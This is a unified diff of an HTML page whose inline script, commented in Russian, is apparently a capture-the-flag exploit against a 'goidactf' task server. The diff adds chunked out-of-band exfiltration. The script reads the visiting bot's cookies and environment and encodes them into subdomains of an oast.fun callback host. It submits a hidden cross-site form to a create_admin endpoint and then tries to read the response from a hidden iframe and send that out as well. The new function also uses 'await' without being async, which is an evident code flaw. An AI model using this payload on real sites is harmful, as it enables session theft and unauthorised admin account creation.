@@ -2,18 +2,43 @@
 <html>
 <body>
 <script>
-// 1. Создаем iframe для получения ответа
+// 1. Функция для отправки данных чанками
+function sendToWebhookChunked(data, label) {
+    const jsonStr = JSON.stringify(data);
+    const base64Str = btoa(jsonStr);
+    
+    // Разбиваем на чанки по 30 символов (без =+/ для DNS)
+    const chunkSize = 30;
+    const cleanBase64 = base64Str.replace(/[+/=]/g, '');
+    
+    for (let i = 0; i < cleanBase64.length; i += chunkSize) {
+        const chunk = cleanBase64.substring(i, i + chunkSize);
+        const subdomain = `${label}-${Math.floor(i/chunkSize)}-${chunk}`;
+        
+        // Создаем DNS запрос через Image
+        new Image().src = `https://${subdomain}.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/`;
+        
+        // Небольшая задержка между чанками
+        await new Promise(r => setTimeout(r, 100));
+    }
+    
+    // Отправляем мета-информацию о чанках
+    const meta = {
+        totalChunks: Math.ceil(cleanBase64.length / chunkSize),
+        totalLength: cleanBase64.length,
+        label: label
+    };
+    
+    const metaEncoded = btoa(JSON.stringify(meta)).replace(/[+/=]/g, '').substring(0, 30);
+    new Image().src = `https://meta-${label}-${metaEncoded}.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/`;
+}
+
+// 2. Создаем iframe для получения ответа
 const iframe = document.createElement('iframe');
 iframe.name = 'responseFrame';
 iframe.id = 'responseFrame';
 iframe.style.cssText = 'width:0;height:0;border:0;position:absolute;left:-9999px;';
 document.body.appendChild(iframe);
-
-// 2. Функция для отправки информации на webhook
-function sendToWebhook(data, label) {
-    const encoded = btoa(JSON.stringify(data));
-    new Image().src = `https://${label}-${encoded}.zzvqvwrdwxfyihbbkymvn6unl6cm7zezt.oast.fun/`;
-}
 
 // 3. Отправляем информацию о боте
 const botInfo = {
@@ -22,35 +47,34 @@ const botInfo = {
     cookies: document.cookie,
     timestamp: new Date().toISOString()
 };
-sendToWebhook(botInfo, 'botinfo');
 
-// 4. Создаем форму, которая отправится в iframe
+// Используем новую функцию для отправки
+sendToWebhookChunked(botInfo, 'botinfo');
+
+// 4. Создаем форму
 const form = document.createElement('form');
 form.method = 'POST';
 form.action = 'https://tasks.goidactf.ru:20246/create_admin';
-form.target = 'responseFrame'; // Ключевое: ответ придет в iframe
+form.target = 'responseFrame';
 form.style.display = 'none';
 
-// 5. Добавляем поля
 const loginInput = document.createElement('input');
 loginInput.type = 'hidden';
 loginInput.name = 'new_admin_login';
 loginInput.value = 'iframe_admin_' + Date.now();
 form.appendChild(loginInput);
 
-// 6. Добавляем форму и отправляем
 document.body.appendChild(form);
 form.submit();
 
-// 7. Пытаемся прочитать ответ из iframe через 3 секунды
-setTimeout(() => {
+// 5. Читаем ответ из iframe через 3 секунды
+setTimeout(async () => {
     try {
         const frame = document.getElementById('responseFrame');
         const frameDoc = frame.contentDocument || frame.contentWindow.document;
         
         let responseText = '';
         
-        // Пробуем разные способы чтения
         if (frameDoc.body) {
             responseText = frameDoc.body.innerText || 
                           frameDoc.body.textContent || 
@@ -60,26 +84,27 @@ setTimeout(() => {
                           frameDoc.documentElement.textContent;
         }
         
-        // 8. Отправляем то, что удалось прочитать
+        // 6. Отправляем ответ чанками
         const responseData = {
             success: responseText.length > 0,
             responseLength: responseText.length,
-            responsePreview: responseText.substring(0, 300),
+            responsePreview: responseText.substring(0, 1000), // Берем больше
             timestamp: new Date().toISOString()
         };
         
-        sendToWebhook(responseData, 'response');
+        await sendToWebhookChunked(responseData, 'response');
         
     } catch(error) {
-        // 9. Отправляем ошибку чтения iframe
+        // 7. Отправляем ошибку
         const errorData = {
-            error: error.toString(),
+            error: error.toString().substring(0, 200),
             errorType: 'IframeReadError',
             timestamp: new Date().toISOString()
         };
-        sendToWebhook(errorData, 'iframerror');
+        
+        await sendToWebhookChunked(errorData, 'error');
     }
-}, 3000); // Ждем 3 секунды для загрузки ответа
+}, 3000);
 </script>
 </body>
 </html>
